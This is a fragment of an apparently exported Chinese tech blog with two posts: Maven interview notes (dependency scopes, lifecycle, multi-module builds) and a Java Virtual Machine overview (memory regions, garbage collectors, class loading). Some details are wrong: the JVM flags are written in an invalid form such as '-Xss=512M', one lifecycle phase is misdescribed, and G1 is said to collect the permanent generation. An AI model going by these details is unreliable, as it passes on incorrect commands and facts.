    <content type="text"><![CDATA[一直在用maven构建web项目，这里把其中的一些面试点记录记录。 maven是什么简单来说，maven是一个能帮你构建工程，管理jar包，编译代码，还能帮你自动运行单元测试，打包，生成报表，甚至能帮你部署项目，生成Web站点等等等等。 Maven可以简化和标准化项目建设过程。处理编译，分配，文档，团队协作和其他任务的无缝连接。 Maven有哪些优点 简化了项目依赖管理： 易于上手，对于新手可能一个”mvn clean package“命令就可能满足他的工作 便于项目升级，无论是项目本身升级还是项目使用的依赖升级。 有助于多模块项目的开发，一个模块开发好后，发布到仓库，依赖该模块时可以直接从仓库更新，而不用自己去编译。 maven有很多插件，便于功能扩展，比如生产站点，自动发布版本等 Maven坐标一般maven使用[groupID,artifactId,version，packaging]来表示一个项目的某个版本，有时还会使用classifier来表示项目的附属构建，常见的附属构建有javadoc和sources包。 Maven常见的依赖范围有哪些? compile:编译依赖，默认的依赖方式，在编译（编译项目和编译测试用例），运行测试用例，运行（项目实际运行）三个阶段都有效，典型地有spring-core等jar。 test:测试依赖，只在编译测试用例和运行测试用例有效，典型地有JUnit。 provided:对于编译和测试有效，不会打包进发布包中，典型的例子为servlet-api,一般的web工程运行时都使用容器的servlet-api。 runtime:只在运行测试用例和实际运行时有效，典型地是jdbc驱动jar包。 system: 不从maven仓库获取该jar,而是通过systemPath指定该jar的路径。 import: 用于一个dependencyManagement对另一个dependencyManagement的继承。 Maven的生命周期 clean 周期：主要用于清理上一次构建产生的文件，可以理解为删除target目录 默认周期，主要阶段包含: process-resources 默认处理src/test/resources/下的文件，将其输出到测试的classpath目录中, compile 编译src/main/java下的java文件，产生对应的class, process-test-resources 默认处理src/test/resources/下的文件，将其输出到测试的classpath目录中, test-compile 编译src/test/java下的java文件，产生对应的class, test 运行测试用例, package 打包构件，即生成对应的jar, war等, install将构件部署到本地仓库, deploy 部署构件到远程仓库 site周期主要阶段包含 site 产生项目的站点文档 site-deploy 将项目的站点文档部署到服务器 我们经常使用“Mvn Clean Package”命令进行项目打包，请问该命令执行了哪些动作来完成该任务？在这个命令中我们调用了maven的clean周期的clean阶段绑定的插件任务，以及default周期的package阶段绑定的插件任务 多模块如何聚合配置一个打包类型为pom的聚合模块，然后在该pom中使用&lt;module&gt;元素声明要聚合的模块 对于一个多模块项目，如果管理项目依赖的版本通过在父模块中声明dependencyManagement和pluginManagement， 然后让子模块通过&lt;parent&gt;元素指定父模块，这样子模块在定义依赖是就可以只定义groupId和artifactId，自动使用父模块的version,这样统一整个项目的依赖的版本。 一个项目的依赖来源于不同的组织，可能这些依赖还会依赖别的Jar包，如何保证这些传递依赖不会引起版本冲突。使用&lt;dependency&gt;的&lt;exclusion&gt;元素将会引起冲突的元素排除。]]></content>
      <tags>
        <tag>计算机网络及其他</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java虚拟机总概览]]></title>
    <url>%2F2018%2F07%2F21%2FJava%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%80%BB%E6%A6%82%E8%A7%88%2F</url>
    <content type="text"><![CDATA[从整体把握虚拟机重要知识点，后面将详细描述虚拟机中的细节。 一、运行时数据区域 程序计数器记录正在执行的虚拟机字节码指令的地址（如果正在执行的是本地方法则为空）。 虚拟机栈每个 Java 方法在执行的同时会创建一个栈帧用于存储局部变量表、操作数栈、常量池引用等信息。每一个方法从调用直至执行完成的过程，就对应着一个栈帧在 Java 虚拟机栈中入栈和出栈的过程。 可以通过 -Xss 这个虚拟机参数来指定一个程序的 Java 虚拟机栈内存大小：1java -Xss=512M HackTheJava 该区域可能抛出以下异常： 当线程请求的栈深度超过最大值，会抛出 StackOverflowError 异常； 栈进行动态扩展时如果无法申请到足够内存，会抛出 OutOfMemoryError 异常。 本地方法栈本地方法不是用 Java 实现，对待这些方法需要特别处理。 与 Java 虚拟机栈类似，它们之间的区别只不过是本地方法栈为本地方法服务。 堆所有对象实例都在这里分配内存。 是垃圾收集的主要区域（”GC 堆”），现代的垃圾收集器基本都是采用分代收集算法，该算法的思想是针对不同的对象采取不同的垃圾回收算法，因此虚拟机把 Java 堆分成以下三块： 新生代（Young Generation） 老年代（Old Generation） 永久代（Permanent Generation） 当一个对象被创建时，它首先进入新生代，之后有可能被转移到老年代中。新生代存放着大量的生命很短的对象，因此新生代在三个区域中垃圾回收的频率最高。为了更高效地进行垃圾回收，把新生代继续划分成以下三个空间： Eden From Survivor To Survivor Java 堆不需要连续内存，并且可以动态增加其内存，增加失败会抛出 OutOfMemoryError 异常。 可以通过 -Xms 和 -Xmx 两个虚拟机参数来指定一个程序的 Java 堆内存大小，第一个参数设置初始值，第二个参数设置最大值。 1java -Xms=1M -Xmx=2M HackTheJava 方法区用于存放已被加载的类信息、常量、静态变量、即时编译器编译后的代码等数据。 和 Java 堆一样不需要连续的内存，并且可以动态扩展，动态扩展失败一样会抛出 OutOfMemoryError 异常。 对这块区域进行垃圾回收的主要目标是对常量池的回收和对类的卸载，但是一般比较难实现。 JDK 1.7 之前，HotSpot 虚拟机把它当成永久代来进行垃圾回收，JDK 1.8 之后，取消了永久代，用 metaspace（元数据）区替代。 运行时常量池运行时常量池是方法区的一部分。 Class 文件中的常量池（编译器生成的各种字面量和符号引用）会在类加载后被放入这个区域。 除了在编译期生成的常量，还允许动态生成，例如 String 类的 intern()。这部分常量也会被放入运行时常量池。 直接内存在 JDK 1.4 中新加入了 NIO 类，它可以使用 Native 函数库直接分配堆外内存，然后通过一个存储在 Java 堆里的 DirectByteBuffer 对象作为这块内存的引用进行操作。这样能在一些场景中显著提高性能，因为避免了在 Java 堆和 Native 堆中来回复制数据。 二、垃圾收集程序计数器、虚拟机栈和本地方法栈这三个区域属于线程私有的，只存在于线程的生命周期内，线程结束之后也会消失，因此不需要对这三个区域进行垃圾回收。垃圾回收主要是针对 Java 堆和方法区进行。 判断一个对象是否可回收1. 引用计数算法给对象添加一个引用计数器，当对象增加一个引用时计数器加 1，引用失效时计数器减 1。引用计数为 0 的对象可被回收。 两个对象出现循环引用的情况下，此时引用计数器永远不为 0，导致无法对它们进行回收。 12345678910public class ReferenceCountingGC &#123; public Object instance = null; public static void main(String[] args) &#123; ReferenceCountingGC objectA = new ReferenceCountingGC(); ReferenceCountingGC objectB = new ReferenceCountingGC(); objectA.instance = objectB; objectB.instance = objectA; &#125;&#125; 正因为循环引用的存在，因此 Java 虚拟机不使用引用计数算法。 2. 可达性分析算法通过 GC Roots 作为起始点进行搜索，能够到达到的对象都是存活的，不可达的对象可被回收。 Java 虚拟机使用该算法来判断对象是否可被回收，在 Java 中 GC Roots 一般包含以下内容： 虚拟机栈中引用的对象 本地方法栈中引用的对象 方法区中类静态属性引用的对象 方法区中的常量引用的对象 3. 引用类型无论是通过引用计算算法判断对象的引用数量，还是通过可达性分析算法判断对象的引用链是否可达，判定对象是否可被回收都与引用有关。 Java 具有四种强度不同的引用类型。 （一）强引用 被强引用关联的对象不会被垃圾收集器回收。 使用 new 一个新对象的方式来创建强引用。 1Object obj = new Object(); （二）软引用 被软引用关联的对象，只有在内存不够的情况下才会被回收。 使用 SoftReference 类来创建软引用。 123Object obj = new Object();SoftReference&lt;Object&gt; sf = new SoftReference&lt;Object&gt;(obj);obj = null; // 使对象只被软引用关联 （三）弱引用 被弱引用关联的对象一定会被垃圾收集器回收，也就是说它只能存活到下一次垃圾收集发生之前。 使用 WeakReference 类来实现弱引用。 123Object obj = new Object();WeakReference&lt;Object&gt; wf = new WeakReference&lt;Object&gt;(obj);obj = null; WeakHashMap 的 Entry 继承自 WeakReference，主要用来实现缓存。 1private static class Entry&lt;K,V&gt; extends WeakReference&lt;Object&gt; implements Map.Entry&lt;K,V&gt; Tomcat 中的 ConcurrentCache 就使用了 WeakHashMap 来实现缓存功能。ConcurrentCache 采取的是分代缓存，经常使用的对象放入 eden 中，而不常用的对象放入 longterm。eden 使用 ConcurrentHashMap 实现，longterm 使用 WeakHashMap，保证了不常使用的对象容易被回收。 1234567891011121314151617181920212223242526272829303132public final class ConcurrentCache&lt;K, V&gt; &#123; private final int size; private final Map&lt;K, V&gt; eden; private final Map&lt;K, V&gt; longterm; public ConcurrentCache(int size) &#123; this.size = size; this.eden = new ConcurrentHashMap&lt;&gt;(size); this.longterm = new WeakHashMap&lt;&gt;(size); &#125; public V get(K k) &#123; V v = this.eden.get(k); if (v == null) &#123; v = this.longterm.get(k); if (v != null) this.eden.put(k, v); &#125; return v; &#125; public void put(K k, V v) &#123; if (this.eden.size() &gt;= size) &#123; this.longterm.putAll(this.eden); this.eden.clear(); &#125; this.eden.put(k, v); &#125;&#125; （四）虚引用 又称为幽灵引用或者幻影引用。一个对象是否有虚引用的存在，完全不会对其生存时间构成影响，也无法通过虚引用取得一个对象实例。 为一个对象设置虚引用关联的唯一目的就是能在这个对象被收集器回收时收到一个系统通知。 使用 PhantomReference 来实现虚引用。 123Object obj = new Object();PhantomReference&lt;Object&gt; pf = new PhantomReference&lt;Object&gt;(obj);obj = null; 4. 方法区的回收因为方法区主要存放永久代对象，而永久代对象的回收率比新生代差很多，因此在方法区上进行回收性价比不高。 主要是对常量池的回收和对类的卸载。 类的卸载条件很多，需要满足以下三个条件，并且满足了也不一定会被卸载： 该类所有的实例都已经被回收，也就是 Java 堆中不存在该类的任何实例。 加载该类的 ClassLoader 已经被回收。 该类对应的 java.lang.Class 对象没有在任何地方被引用，也就无法在任何地方通过反射访问该类方法。 可以通过-Xnoclassgc 参数来控制是否对类进行卸载。 在大量使用反射、动态代理、CGLib 等 ByteCode 框架、动态生成 JSP 以及 OSGi 这类频繁自定义 ClassLoader 的场景都需要虚拟机具备类卸载功能，以保证不会出现内存溢出。 5. finalize()finalize() 类似 C++ 的析构函数，用来做关闭外部资源等工作。但是 try-finally 等方式可以做的更好，并且该方法运行代价高昂，不确定性大，无法保证各个对象的调用顺序，因此最好不要使用。 当一个对象可被回收时，如果需要执行该对象的 finalize() 方法，那么就有可能通过在该方法中让对象重新被引用，从而实现自救。 垃圾收集算法1. 标记 - 清除 将需要存活的对象进行标记，然后清理掉未被标记的对象。 不足： 标记和清除过程效率都不高； 会产生大量不连续的内存碎片，导致无法给大对象分配内存。 2. 标记 - 整理 让所有存活的对象都向一端移动，然后直接清理掉端边界以外的内存。 3. 复制 将内存划分为大小相等的两块，每次只使用其中一块，当这一块内存用完了就将还存活的对象复制到另一块上面，然后再把使用过的内存空间进行一次清理。 主要不足是只使用了内存的一半。 现在的商业虚拟机都采用这种收集算法来回收新生代，但是并不是将内存划分为大小相等的两块，而是分为一块较大的 Eden 空间和两块较小的 Survior 空间，每次使用 Eden 空间和其中一块 Survivor。在回收时，将 Eden 和 Survivor 中还存活着的对象一次性复制到另一块 Survivor 空间上，最后清理 Eden 和使用过的那一块 Survivor。HotSpot 虚拟机的 Eden 和 Survivor 的大小比例默认为 8:1，保证了内存的利用率达到 90 %。如果每次回收有多于 10% 的对象存活，那么一块 Survivor 空间就不够用了，此时需要依赖于老年代进行分配担保，也就是借用老年代的空间存储放不下的对象。 4. 分代收集现在的商业虚拟机采用分代收集算法，它根据对象存活周期将内存划分为几块，不同块采用适当的收集算法。 一般将 Java 堆分为新生代和老年代。 新生代使用：复制算法 老年代使用：标记 - 清理 或者 标记 - 整理 算法 垃圾收集器 以上是 HotSpot 虚拟机中的 7 个垃圾收集器，连线表示垃圾收集器可以配合使用。 1. Serial 收集器 Serial 翻译为串行，垃圾收集和用户程序不能同时执行，这意味着在执行垃圾收集的时候需要停顿用户程序。除了 CMS 和 G1 之外，其它收集器都是以串行的方式执行。CMS 和 G1 可以使得垃圾收集和用户程序同时执行，被称为并发执行。 它是单线程的收集器，只会使用一个线程进行垃圾收集工作。 它的优点是简单高效，对于单个 CPU 环境来说，由于没有线程交互的开销，因此拥有最高的单线程收集效率。 它是 Client 模式下的默认新生代收集器，因为在用户的桌面应用场景下，分配给虚拟机管理的内存一般来说不会很大。Serial 收集器收集几十兆甚至一两百兆的新生代停顿时间可以控制在一百多毫秒以内，只要不是太频繁，这点停顿是可以接受的。 2. ParNew 收集器 它是 Serial 收集器的多线程版本。 是 Server模式下的虚拟机首选新生代收集器，除了性能原因外，主要是因为除了 Serial 收集器，只有它能与 CMS 收集器配合工作。 默认开始的线程数量与 CPU 数量相同，可以使用 -XX:ParallelGCThreads 参数来设置线程数。 3. Parallel Scavenge 收集器与 ParNew 一样是并行的多线程收集器。 其它收集器关注点是尽可能缩短垃圾收集时用户线程的停顿时间，而它的目标是达到一个可控制的吞吐量，它被称为“吞吐量优先”收集器。这里的吞吐量指 CPU 用于运行用户代码的时间占总时间的比值。 停顿时间越短就越适合需要与用户交互的程序，良好的响应速度能提升用户体验。而高吞吐量则可以高效率地利用 CPU 时间，尽快完成程序的运算任务，主要适合在后台运算而不需要太多交互的任务。 提供了两个参数用于精确控制吞吐量，分别是控制最大垃圾收集停顿时间 -XX:MaxGCPauseMillis 参数以及直接设置吞吐量大小的 -XX:GCTimeRatio 参数（值为大于 0 且小于 100 的整数）。缩短停顿时间是以牺牲吞吐量和新生代空间来换取的：新生代空间变小，垃圾回收变得频繁，导致吞吐量下降。 还提供了一个参数 -XX:+UseAdaptiveSizePolicy，这是一个开关参数，打开参数后，就不需要手工指定新生代的大小（-Xmn）、Eden 和 Survivor 区的比例（-XX:SurvivorRatio）、晋升老年代对象年龄（-XX:PretenureSizeThreshold）等细节参数了，虚拟机会根据当前系统的运行情况收集性能监控信息，动态调整这些参数以提供最合适的停顿时间或者最大的吞吐量，这种方式称为 GC 自适应的调节策略（GC Ergonomics）。 4. Serial Old 收集器 是 Serial 收集器的老年代版本，也是给 Client 模式下的虚拟机使用。如果用在 Server 模式下，它有两大用途： 在 JDK 1.5 以及之前版本（Parallel Old 诞生以前）中与 Parallel Scavenge 收集器搭配使用。 作为 CMS 收集器的后备预案，在并发收集发生 Concurrent Mode Failure 时使用。 5. Parallel Old 收集器 是 Parallel Scavenge 收集器的老年代版本。 在注重吞吐量以及 CPU 资源敏感的场合，都可以优先考虑 Parallel Scavenge 加 Parallel Old 收集器。 6. CMS 收集器 CMS（Concurrent Mark Sweep），Mark Sweep 指的是标记 - 清除算法。 特点：并发收集、低停顿。并发指的是用户线程和 GC 线程同时运行。 分为以下四个流程： 初始标记：仅仅只是标记一下 GC Roots 能直接关联到的对象，速度很快，需要停顿。 并发标记：进行GC Roots Tracing 的过程，它在整个回收过程中耗时最长，不需要停顿。 重新标记：为了修正并发标记期间因用户程序继续运作而导致标记产生变动的那一部分对象的标记记录，需要停顿。 并发清除：不需要停顿。 在整个过程中耗时最长的并发标记和并发清除过程中，收集器线程都可以与用户线程一起工作，不需要进行停顿。 具有以下缺点： 吞吐量低：低停顿时间是以牺牲吞吐量为代价的，导致 CPU 利用率不够高。 无法处理浮动垃圾，可能出现 Concurrent Mode Failure。浮动垃圾是指并发清除阶段由于用户线程继续运行而产生的垃圾，这部分垃圾只能到下一次 GC 时才能进行回收。由于浮动垃圾的存在，因此需要预留出一部分内存，意味着 CMS 收集不能像其它收集器那样等待老年代快满的时候再回收。可以使用 -XX:CMSInitiatingOccupancyFraction 来改变触发 CMS 收集器工作的内存占用百分，如果这个值设置的太大，导致预留的内存不够存放浮动垃圾，就会出现 Concurrent Mode Failure，这时虚拟机将临时启用 Serial Old 来替代 CMS。 标记 - 清除算法导致的空间碎片，往往出现老年代空间剩余，但无法找到足够大连续空间来分配当前对象，不得不提前触发一次 Full GC。 7. G1 收集器G1（Garbage-First），它是一款面向服务端应用的垃圾收集器，在多 CPU 和大内存的场景下有很好的性能。HotSpot 开发团队赋予它的使命是未来可以替换掉 CMS 收集器。 Java 堆被分为新生代、老年代和永久代，其它收集器进行收集的范围都是整个新生代或者老生代，而 G1 可以直接对新生代和永久代一起回收。 G1 把新生代和老年代划分成多个大小相等的独立区域（Region），新生代和永久代不再物理隔离。 通过引入 Region 的概念，从而将原来的一整块内存空间划分成多个的小空间，使得每个小空间可以单独进行垃圾回收。这种划分方法带来了很大的灵活性，使得可预测的停顿时间模型成为可能。通过记录每个 Region 垃圾回收时间以及回收所获得的空间（这两个值是通过过去回收的经验获得），并维护一个优先列表，每次根据允许的收集时间，优先回收价值最大的 Region。 每个 Region 都有一个 Remembered Set，用来记录该 Region 对象的引用对象所在的 Region。通过使用 Remembered Set，在做可达性分析的时候就可以避免全堆扫描。 如果不计算维护 Remembered Set 的操作，G1 收集器的运作大致可划分为以下几个步骤： 初始标记 并发标记 最终标记：为了修正在并发标记期间因用户程序继续运作而导致标记产生变动的那一部分标记记录，虚拟机将这段时间对象变化记录在线程的 Remembered Set Logs 里面，最终标记阶段需要把 Remembered Set Logs 的数据合并到 Remembered Set 中。这阶段需要停顿线程，但是可并行执行。 筛选回收：首先对各个 Region 中的回收价值和成本进行排序，根据用户所期望的 GC 停顿是时间来制定回收计划。此阶段其实也可以做到与用户程序一起并发执行，但是因为只回收一部分 Region，时间是用户可控制的，而且停顿用户线程将大幅度提高收集效率。 具备如下特点： 空间整合：整体来看是基于“标记 - 整理”算法实现的收集器，从局部（两个 Region 之间）上来看是基于“复制”算法实现的，这意味着运行期间不会产生内存空间碎片。 可预测的停顿：能让使用者明确指定在一个长度为 M 毫秒的时间片段内，消耗在 GC 上的时间不得超过 N 毫秒。 8. 比较 收集器 串行/并行/并发 新生代/老年代 收集算法 目标 适用场景 Serial 串行 新生代 复制 响应速度优先 单 CPU 环境下的 Client 模式 Serial Old 串行 老年代 标记-整理 响应速度优先 单 CPU 环境下的 Client 模式、CMS 的后备预案 ParNew 串行 + 并行 新生代 复制算法 响应速度优先 多 CPU 环境时在 Server 模式下与 CMS 配合 Parallel Scavenge 串行 + 并行 新生代 复制算法 吞吐量优先 在后台运算而不需要太多交互的任务 Parallel Old 串行 + 并行 老年代 标记-整理 吞吐量优先 在后台运算而不需要太多交互的任务 CMS 并行 + 并发 老年代 标记-清除 响应速度优先 集中在互联网站或 B/S 系统服务端上的 Java 应用 G1 并行 + 并发 新生代 + 老年代 标记-整理 + 复制算法 响应速度优先 面向服务端应用，将来替换 CMS 内存分配与回收策略对象的内存分配，也就是在堆上分配。主要分配在新生代的 Eden 区上，少数情况下也可能直接分配在老年代中。 1. Minor GC 和 Full GC Minor GC：发生在新生代上，因为新生代对象存活时间很短，因此 Minor GC 会频繁执行，执行的速度一般也会比较快。 Full GC：发生在老年代上，老年代对象和新生代的相反，其存活时间长，因此 Full GC 很少执行，而且执行速度会比 Minor GC 慢很多。 2. 内存分配策略（一）对象优先在 Eden 分配 大多数情况下，对象在新生代 Eden 区分配，当 Eden 区空间不够时，发起 Minor GC。 （二）大对象直接进入老年代 大对象是指需要连续内存空间的对象，最典型的大对象是那种很长的字符串以及数组。 经常出现大对象会提前触发垃圾收集以获取足够的连续空间分配给大对象。 -XX:PretenureSizeThreshold，大于此值的对象直接在老年代分配，避免在 Eden 区和 Survivor 区之间的大量内存复制。 （三）长期存活的对象进入老年代 为对象定义年龄计数器，对象在 Eden 出生并经过 Minor GC 依然存活，将移动到 Survivor 中，年龄就增加 1 岁，增加到一定年龄则移动到老年代中。 -XX:MaxTenuringThreshold 用来定义年龄的阈值。 （四）动态对象年龄判定 虚拟机并不是永远地要求对象的年龄必须达到 MaxTenuringThreshold 才能晋升老年代，如果在 Survivor 区中相同年龄所有对象大小的总和大于 Survivor 空间的一半，则年龄大于或等于该年龄的对象可以直接进入老年代，无需等到 MaxTenuringThreshold 中要求的年龄。 （五）空间分配担保 在发生 Minor GC之前，虚拟机先检查老年代最大可用的连续空间是否大于新生代所有对象总空间，如果条件成立的话，那么 Minor GC 可以确认是安全的；如果不成立的话虚拟机会查看 HandlePromotionFailure 设置值是否允许担保失败，如果允许那么就会继续检查老年代最大可用的连续空间是否大于历次晋升到老年代对象的平均大小，如果大于，将尝试着进行一次 Minor GC，尽管这次 Minor GC 是有风险的；如果小于，或者 HandlePromotionFailure 设置不允许冒险，那这时也要改为进行一次 Full GC。 3. Full GC 的触发条件对于 Minor GC，其触发条件非常简单，当 Eden 区空间满时，就将触发一次 Minor GC。而 Full GC 则相对复杂，有以下条件： （一）调用 System.gc() 此方法的调用是建议虚拟机进行 Full GC，虽然只是建议而非一定，但很多情况下它会触发 Full GC，从而增加 Full GC 的频率，也即增加了间歇性停顿的次数。因此强烈建议能不使用此方法就不要使用，让虚拟机自己去管理它的内存。可通过 -XX:DisableExplicitGC 来禁止 RMI 调用 System.gc()。 （二）老年代空间不足 老年代空间不足的常见场景为前文所讲的大对象直接进入老年代、长期存活的对象进入老年代等，当执行 Full GC 后空间仍然不足，则抛出 Java.lang.OutOfMemoryError。为避免以上原因引起的 Full GC，调优时应尽量做到让对象在Minor GC 阶段被回收、让对象在新生代多存活一段时间以及不要创建过大的对象及数组。 （三）空间分配担保失败 使用复制算法的 Minor GC 需要老年代的内存空间作担保，如果出现了 HandlePromotionFailure 担保失败，则会触发 Full GC。 （四）JDK 1.7 及以前的永久代空间不足 在 JDK 1.7 及以前，HotSpot 虚拟机中的方法区是用永久代实现的，永久代中存放的为一些 Class 的信息、常量、静态变量等数据，当系统中要加载的类、反射的类和调用的方法较多时，永久代可能会被占满，在未配置为采用 CMS GC 的情况下也会执行 Full GC。如果经过 Full GC 仍然回收不了，那么虚拟机会抛出 java.lang.OutOfMemoryError，为避免以上原因引起的 Full GC，可采用的方法为增大永久代空间或转为使用 CMS GC。 （五）Concurrent Mode Failure 执行 CMS GC 的过程中同时有对象要放入老年代，而此时老年代空间不足（有时候“空间不足”是 CMS GC 时当前的浮动垃圾过多导致暂时性的空间不足触发 Full GC），便会报 Concurrent Mode Failure 错误，并触发 Full GC。 三、类加载机制类是在运行期间动态加载的。 类的生命周期 包括以下 7 个阶段： 加载（Loading） 验证（Verification） 准备（Preparation） 解析（Resolution） 初始化（Initialization） 使用（Using） 卸载（Unloading） 其中解析过程在某些情况下可以在初始化阶段之后再开始，这是为了支持 Java 的动态绑定。 类初始化时机虚拟机规范中并没有强制约束何时进行加载，但是规范严格规定了有且只有下列五种情况必须对类进行初始化（加载、验证、准备都会随着发生）： 遇到 new、getstatic、putstatic、invokestatic 这四条字节码指令时，如果类没有进行过初始化，则必须先触发其初始化。最常见的生成这 4 条指令的场景是：使用 new 关键字实例化对象的时候；读取或设置一个类的静态字段（被 final 修饰、已在编译期把结果放入常量池的静态字段除外）的时候；以及调用一个类的静态方法的时候。 使用 java.lang.reflect 包的方法对类进行反射调用的时候，如果类没有进行初始化，则需要先触发其初始化。 当初始化一个类的时候，如果发现其父类还没有进行过初始化，则需要先触发其父类的初始化。 当虚拟机启动时，用户需要指定一个要执行的主类（包含 main() 方法的那个类），虚拟机会先初始化这个主类； 当使用 JDK 1.7 的动态语言支持时，如果一个 java.lang.invoke.MethodHandle 实例最后的解析结果为 REF_getStatic, REF_putStatic, REF_invokeStatic 的方法句柄，并且这个方法句柄所对应的类没有进行过初始化，则需要先触发其初始化； 以上 5 种场景中的行为称为对一个类进行主动引用。除此之外，所有引用类的方式都不会触发初始化，称为被动引用。被动引用的常见例子包括： 通过子类引用父类的静态字段，不会导致子类初始化。 1System.out.println(SubClass.value); // value 字段在 SuperClass 中定义 通过数组定义来引用类，不会触发此类的初始化。该过程会对数组类进行初始化，数组类是一个由虚拟机自动生成的、直接继承自 Object 的子类，其中包含了数组的属性和方法。 1SuperClass[] sca = new SuperClass[10]; 常量在编译阶段会存入调用类的常量池中，本质上并没有直接引用到定义常量的类，因此不会触发定义常量的类的初始化。 1System.out.println(ConstClass.HELLOWORLD); 类加载过程包含了加载、验证、准备、解析和初始化这 5 个阶段。 1. 加载加载是类加载的一个阶段，注意不要混淆。 加载过程完成以下三件事： 通过一个类的全限定名来获取定义此类的二进制字节流。 将这个字节流所代表的静态存储结构转化为方法区的运行时存储结构。 在内存中生成一个代表这个类的 Class 对象，作为方法区这个类的各种数据的访问入口。 其中二进制字节流可以从以下方式中获取： 从 ZIP 包读取，这很常见，最终成为日后 JAR、EAR、WAR 格式的基础。 从网络中获取，这种场景最典型的应用是 Applet。 运行时计算生成，这种场景使用得最多得就是动态代理技术，在 java.lang.reflect.Proxy 中，就是用了 ProxyGenerator.generateProxyClass 的代理类的二进制字节流。 由其他文件生成，典型场景是 JSP 应用，即由 JSP 文件生成对应的 Class 类。 从数据库读取，这种场景相对少见，例如有些中间件服务器（如 SAP Netweaver）可以选择把程序安装到数据库中来完成程序代码在集群间的分发。… 2. 验证确保 Class 文件的字节流中包含的信息符合当前虚拟机的要求，并且不会危害虚拟机自身的安全。 文件格式验证：验证字节流是否符合 Class 文件格式的规范，并且能被当前版本的虚拟机处理。 元数据验证：对字节码描述的信息进行语义分析，以保证其描述的信息符合 Java 语言规范的要求。 字节码验证：通过数据流和控制流分析，确保程序语义是合法、符合逻辑的。 符号引用验证：发生在虚拟机将符号引用转换为直接引用的时候，对类自身以外（常量池中的各种符号引用）的信息进行匹配性校验。 3. 准备类变量是被 static 修饰的变量，准备阶段为类变量分配内存并设置初始值，使用的是方法区的内存。 实例变量不会在这阶段分配内存，它将会在对象实例化时随着对象一起分配在 Java 堆中。（实例化不是类加载的一个过程，类加载发生在所有实例化操作之前，并且类加载只进行一次，实例化可以进行多次） 初始值一般为 0 值，例如下面的类变量 value 被初始化为 0 而不是 123。 1public static int value = 123; 如果类变量是常量，那么会按照表达式来进行初始化，而不是赋值为 0。 1public static final int value = 123; 4. 解析将常量池的符号引用替换为直接引用的过程。 5. 初始化初始化阶段才真正开始执行类中的定义的 Java 程序代码。初始化阶段即虚拟机执行类构造器 &lt;clinit&gt;() 方法的过程。 在准备阶段，类变量已经赋过一次系统要求的初始值，而在初始化阶段，根据程序员通过程序制定的主观计划去初始化类变量和其它资源。 &lt;clinit&gt;() 方法具有以下特点： 是由编译器自动收集类中所有类变量的赋值动作和静态语句块（static{} 块）中的语句合并产生的，编译器收集的顺序由语句在源文件中出现的顺序决定。特别注意的是，静态语句块只能访问到定义在它之前的类变量，定义在它之后的类变量只能赋值，不能访问。例如以下代码： 1234567public class Test &#123; static &#123; i = 0; // 给变量赋值可以正常编译通过 System.out.print(i); // 这句编译器会提示“非法向前引用” &#125; static int i = 1;&#125; 与类的构造函数（或者说实例构造器 &lt;init&gt;()）不同，不需要显式的调用父类的构造器。虚拟机会自动保证在子类的 &lt;clinit&gt;() 方法运行之前，父类的 &lt;clinit&gt;() 方法已经执行结束。因此虚拟机中第一个执行 &lt;clinit&gt;() 方法的类肯定为 java.lang.Object。 由于父类的 &lt;clinit&gt;() 方法先执行，也就意味着父类中定义的静态语句块要优于子类的变量赋值操作。例如以下代码： 1234567891011121314static class Parent &#123; public static int A = 1; static &#123; A = 2; &#125;&#125;static class Sub extends Parent &#123; public static int B = A;&#125;public static void main(String[] args) &#123; System.out.println(Sub.B); // 输出结果是父类中的静态变量 A 的值，也就是 2。&#125; &lt;clinit&gt;() 方法对于类或接口不是必须的，如果一个类中不包含静态语句块，也没有对类变量的赋值操作，编译器可以不为该类生成 &lt;clinit&gt;() 方法。 接口中不可以使用静态语句块，但仍然有类变量初始化的赋值操作，因此接口与类一样都会生成 &lt;clinit&gt;() 方法。但接口与类不同的是，执行接口的 &lt;clinit&gt;() 方法不需要先执行父接口的 &lt;clinit&gt;() 方法。只有当父接口中定义的变量使用时，父接口才会初始化。另外，接口的实现类在初始化时也一样不会执行接口的 &lt;clinit&gt;() 方法。 虚拟机会保证一个类的 &lt;clinit&gt;() 方法在多线程环境下被正确的加锁和同步，如果多个线程同时初始化一个类，只会有一个线程执行这个类的 &lt;clinit&gt;() 方法，其它线程都会阻塞等待，直到活动线程执行 &lt;clinit&gt;() 方法完毕。如果在一个类的 &lt;clinit&gt;() 方法中有耗时的操作，就可能造成多个线程阻塞，在实际过程中此种阻塞很隐蔽。 类加载器实现类的加载动作。在 Java 虚拟机外部实现，以便让应用程序自己决定如何去获取所需要的类。 1. 类与类加载器两个类相等：类本身相等，并且使用同一个类加载器进行加载。这是因为每一个类加载器都拥有一个独立的类名称空间。 这里的相等，包括类的 Class 对象的 equals() 方法、isAssignableFrom() 方法、isInstance() 方法的返回结果为 true，也包括使用 instanceof 关键字做对象所属关系判定结果为 true。 2. 类加载器分类从 Java 虚拟机的角度来讲，只存在以下两种不同的类加载器： 启动类加载器（Bootstrap ClassLoader），这个类加载器用 C++ 实现，是虚拟机自身的一部分； 所有其他类的加载器，这些类由 Java 实现，独立于虚拟机外部，并且全都继承自抽象类 java.lang.ClassLoader。 从 Java 开发人员的角度看，类加载器可以划分得更细致一些： 启动类加载器（Bootstrap ClassLoader）此类加载器负责将存放在 &lt;JAVA_HOME&gt;\lib 目录中的，或者被 -Xbootclasspath 参数所指定的路径中的，并且是虚拟机识别的（仅按照文件名识别，如 rt.jar，名字不符合的类库即使放在 lib 目录中也不会被加载）类库加载到虚拟机内存中。启动类加载器无法被 Java 程序直接引用，用户在编写自定义类加载器时，如果需要把加载请求委派给启动类加载器，直接使用 null 代替即可。 扩展类加载器（Extension ClassLoader）这个类加载器是由 ExtClassLoader（sun.misc.Launcher$ExtClassLoader）实现的。它负责将 &lt;JAVA_HOME&gt;/lib/ext 或者被 java.ext.dir 系统变量所指定路径中的所有类库加载到内存中，开发者可以直接使用扩展类加载器。 应用程序类加载器（Application ClassLoader）这个类加载器是由 AppClassLoader（sun.misc.Launcher$AppClassLoader）实现的。由于这个类加载器是 ClassLoader 中的 getSystemClassLoader() 方法的返回值，因此一般称为系统类加载器。它负责加载用户类路径（ClassPath）上所指定的类库，开发者可以直接使用这个类加载器，如果应用程序中没有自定义过自己的类加载器，一般情况下这个就是程序中默认的类加载器。 3. 双亲委派模型应用程序都是由三种类加载器相互配合进行加载的，如果有必要，还可以加入自己定义的类加载器。 下图展示的类加载器之间的层次关系，称为类加载器的双亲委派模型（Parents Delegation 